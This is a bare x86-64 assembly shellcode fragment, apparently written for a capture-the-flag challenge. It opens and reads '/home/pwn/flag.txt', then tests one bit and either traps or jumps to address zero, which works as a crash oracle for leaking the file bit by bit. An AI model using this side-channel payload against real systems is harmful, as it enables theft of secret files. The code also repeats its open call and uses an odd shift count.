    BITS 64
    mov rsi, 0x0
    lea rdi, [rel flag]
    mov rax, 0x2
    syscall
    mov rsi, 0x0
    lea rdi, [rel flag]
    mov rax, 0x2
    syscall
    mov rdi, rax
    mov rax, 0x0
    mov rsi, 0x6021e0
    mov rdx, 0x64
    syscall
    mov al, [rsi+0x22]
    shr al, 0x44
    test al, 1
    jnz yes
    int3
yes:
    mov rax, 0x0
    jmp rax
flag:
    db "/home/pwn/flag.txt", 0


